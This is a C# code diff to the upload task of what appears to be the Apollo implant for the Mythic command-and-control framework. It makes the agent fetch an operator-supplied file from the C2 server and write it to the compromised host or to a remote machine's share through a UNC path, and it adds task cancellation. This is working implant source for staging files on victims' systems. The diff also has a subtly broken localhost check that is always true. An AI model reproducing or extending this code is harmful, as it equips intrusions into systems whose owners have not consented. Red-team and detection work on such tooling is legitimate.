@@ -8,6 +8,7 @@ using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using ApolloInterop.Serializers;
 using System.Threading;
+using System.IO;
 
 namespace Tasks
 {
@@ -33,7 +34,46 @@ namespace Tasks
 
         public override void Kill()
         {
-            throw new NotImplementedException();
+            _cancellationToken.Cancel();
+        }
+
+        internal string ParsePath(UploadParameters p)
+        {
+            string host = "";
+            string path = "";
+            if (!string.IsNullOrEmpty(p.HostName))
+            {
+                if (p.HostName != "127.0.0.1" || p.HostName.ToLower() != "localhost")
+                {
+                    host = p.HostName;
+                }
+            }
+            if (!string.IsNullOrEmpty(p.RemotePath))
+            {
+                if (Directory.Exists(p.RemotePath))
+                {
+                    path = Path.Combine(new string[]
+                    {
+                        p.RemotePath,
+                        p.FileName
+                    });
+                } else
+                {
+                    path = Path.Combine(new string[]
+                    {
+                        Directory.GetCurrentDirectory(),
+                        p.FileName
+                    });
+                }
+            }
+
+            if (!string.IsNullOrEmpty(host))
+            {
+                return string.Format(@"\\{0}\{1}", host, path);
+            } else
+            {
+                return path;
+            }
         }
 
         public override System.Threading.Tasks.Task CreateTasking()
@@ -41,39 +81,44 @@ namespace Tasks
             return new System.Threading.Tasks.Task(() =>
             {
                 TaskResponse resp;
-                ApolloInterop.Classes.P2P.Peer p = null;
-                try
+                UploadParameters parameters = _jsonSerializer.Deserialize<UploadParameters>(_data.Parameters);
+                // some additional upload logic
+                if (_agent.GetFileManager().GetFile(
+                    _cancellationToken.Token,
+                    _data.ID,
+                    parameters.FileID,
+                    out byte[] fileData))
                 {
-                    UploadParameters parameters = _jsonSerializer.Deserialize<UploadParameters>(_data.Parameters);
-                    // some additional upload logic
-                    if (_agent.GetFileManager().GetFile(
-                        _cancellationToken.Token,
-                        _data.ID,
-                        parameters.FileID,
-                        out byte[] fileData))
+                    string path = ParsePath(parameters);
+                    File.WriteAllBytes(path, fileData);
+                    resp = CreateTaskResponse(
+                        $"Uploaded {fileData.Length} bytes to {path}",
+                        true,
+                        "completed",
+                        new IMythicMessage[]
+                        {
+                            new UploadMessage()
+                            {
+                                FileID = parameters.FileID,
+                                FullPath = path
+                            },
+                            new Artifact()
+                            {
+                                BaseArtifact = "FileCreate",
+                                ArtifactDetails = $"Wrote {fileData.Length} to {path}"
+                            }
+                        });
+                } else
+                {
+                    if (_cancellationToken.IsCancellationRequested)
                     {
-                        System.IO.File.WriteAllBytes(parameters.RemotePath, fileData);
-                        resp = CreateTaskResponse(
-                            $"Uploaded file to {parameters.RemotePath}",
-                            true,
-                            "completed");
+                        resp = CreateTaskResponse($"Task killed.", true, "killed");
                     } else
                     {
-                        resp = CreateTaskResponse($"Failed to fetch file.", true, "error");
+                        resp = CreateTaskResponse("Failed to fetch file due to unknown reason.", true, "error");
                     }
                 }
-                catch (Exception ex)
-                {
-                    resp = CreateTaskResponse(
-                        $"{ex.StackTrace}\n\nFailed to establish connection. Reason: {ex.Message}",
-                        true,
-                        "error");
-                    if (p != null)
-                    {
-                        _agent.GetPeerManager().Remove(p);
-                    }
-                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                }
+                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
             }, _cancellationToken.Token);
         }
     }
